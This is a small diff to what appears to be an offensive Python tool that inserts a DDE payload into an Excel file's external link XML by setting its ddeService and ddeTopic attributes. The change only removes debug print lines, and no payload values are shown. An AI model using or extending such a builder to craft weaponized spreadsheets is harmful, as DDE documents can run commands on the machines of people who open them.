@@ -90,11 +90,8 @@ if __name__ == "__main__":
     print('[*] Inserting DDE payload into {}/xl/externalLinks/externalLink1.xml...'.format(payload_out))
     for node in doctree.iter(tag=etree.Element):
         if "ddeLink" in node.tag:
-            print node.tag
-            print etree.tostring(node)
             node.attrib['ddeService'] = ddeService
             node.attrib['ddeTopic'] = ddeTopic
-            print etree.tostring(doctree)
     
     # Create temp directory and extract payload.xlsx file to it
     tmp_dir_pay = tempfile.mkdtemp()
